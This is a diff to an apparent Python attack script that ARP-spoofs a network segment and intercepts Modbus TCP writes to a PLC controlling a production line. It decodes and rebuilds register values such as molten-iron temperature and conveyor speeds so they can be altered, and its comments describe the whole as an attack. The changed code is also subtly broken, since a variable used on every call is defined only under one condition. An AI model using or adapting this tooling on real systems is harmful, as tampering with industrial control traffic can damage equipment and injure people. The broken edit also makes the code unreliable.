@@ -334,35 +334,24 @@ def parse_modbus_data(packet, sport, dport):
                     a4 = int.from_bytes(register_values[6:8], byteorder='big')  # 模具温度单位为K，向下取整
                     a5 = int.from_bytes(register_values[8:10], byteorder='big')  # 传送带1速度单位为cm/s，可能是向下取整
                     a6 = int.from_bytes(register_values[10:12], byteorder='big')  # 传送带2速度单位为cm/s，可能是向下取整
-
+                    if a6 > 63000:
+                        aa6 = a6 - 65536
                     # 创建线程执行 print_data_tgzm
-                    print_thread = threading.Thread(target=print_data_tgzm, args=(a1, a2, a3, a4, a5, a6))
+                    print_thread = threading.Thread(target=print_data_tgzm, args=(a1, a2, a3, a4, a5, aa6))
                     print_thread.start()  # 启动线程
                     # 输出结果
                     #print(f"写多个保持寄存器: 起始地址: {register_address}, 寄存器数量: {register_count}, 字节数: {byte_count}, 值: {binascii.hexlify(register_values)}")
                     #print(f"铁水wendu（K）: {a1}, houdu(m): {a2}, zhiji（mm）: {a3}, mojuwendu（K）: {a4}, 传送带1sudu: {a5}, 传送带2sudu: {a6}")
                     # 这个可以对这6个变量进行修改，是plc控制生产线的初始数据
                     #xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()
-                    loag = 0
 
-                    if a6 > 63000:
-                        a6 = a6 - 65536
-                    if loag == 1:
-                        xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
-                        #xmodbus_data += xa1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
-                        #xmodbus_data += xa2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
-                        #xmodbus_data += xa3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
-                        #xmodbus_data += xa4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
-                        #xmodbus_data += xa5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
-                        #xmodbus_data += xa6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
-                    else:
-                        xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
-                        xmodbus_data += a1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
-                        xmodbus_data += a2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
-                        xmodbus_data += a3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
-                        xmodbus_data += a4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
-                        xmodbus_data += a5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
-                        xmodbus_data += a6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
+                    xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
+                    xmodbus_data += a1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
+                    xmodbus_data += a2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
+                    xmodbus_data += a3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
+                    xmodbus_data += a4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
+                    xmodbus_data += a5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
+                    xmodbus_data += a6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
                     modbus_tdate = mbap_header  # MBAP header 前 7 字节
                     modbus_tdate += xmodbus_data  # 合并 xmodbus_data 到 modbus_tdate
                     payload = modbus_tdate
@@ -549,7 +538,7 @@ def main():
             observed_mac = getmacbyip(target_ip)
             if observed_mac != gateway_mac:
                 print(f"[INFO] ARP 已被篡改: {observed_mac}")
-            time.sleep(1)
+            time.sleep(2)
 
     except KeyboardInterrupt:
         # 捕获 Ctrl+C，停止攻击
